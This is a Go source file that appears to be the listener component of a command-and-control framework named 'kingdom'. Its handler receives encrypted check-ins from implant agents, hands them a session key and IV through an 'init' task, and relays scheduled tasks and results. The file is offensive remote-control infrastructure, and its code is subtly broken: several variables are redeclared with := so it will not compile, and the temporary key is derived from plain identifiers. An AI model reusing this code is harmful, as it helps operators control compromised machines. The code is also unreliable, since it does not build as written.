package listeners

import (
	"bytes"
	"io"
	scheduler "kingdom/internal/c2"
	comms "kingdom/internal/comms"
	commstypes "kingdom/internal/comms/comms_types"
	storage "kingdom/internal/storage"
)

func HandleRequest(clientID string, agentID string, body io.ReadCloser) ([]byte, error) {
	defer body.Close()

	rawData, err := io.ReadAll(body)
	if err != nil {
		return nil, err
	}

	sess, found := storage.GetSession(clientID, agentID)
	if !found {
		temp_key, temp_iv, err := comms.GenerateTempKeyAndIV(clientID, agentID)
		if err != nil {
			return nil, err
		}

		req, err := comms.Decode[commstypes.Request](rawData, temp_key, temp_iv)
		if err != nil {
			return nil, err
		}

		_, err := scheduler.ScheduleTask(clientID, agentID, req)
		if err != nil {
			return nil, err
		}

		key, err := comms.GenerateKey()
		if err != nil {
			return nil, err
		}
		iv, err := comms.GenerateIV()
		if err != nil {
			return nil, err
		}

		sess := storage.NewSession(clientID, agentID, key, iv)
		err := storage.SaveSession(sess)
		if err != nil {
			return nil, err
		}
		init := &commstypes.Task{
			ID:      "session_init",
			Command: "init",
			Args: string(bytes.Join([][]byte{
				[]byte(key),
				[]byte(iv),
			}, []byte(","))),
		}
		resp, _, _, err := comms.Encode(init, temp_key, temp_iv)
		if err != nil {
			return nil, err
		}
		return resp, nil
	} else {
		key := sess.Key
		iv := sess.IV

		req, err := comms.Decode[commstypes.TaskResult](rawData, key, iv)
		if err != nil {
			return nil, err
		}

		task, err := scheduler.ScheduleTask(clientID, agentID, req)
		if err != nil {
			return nil, err
		}

		resp, _, _, err := comms.Encode(task, key, iv)
		if err != nil {
			return nil, err
		}

		return resp, nil
	}
}
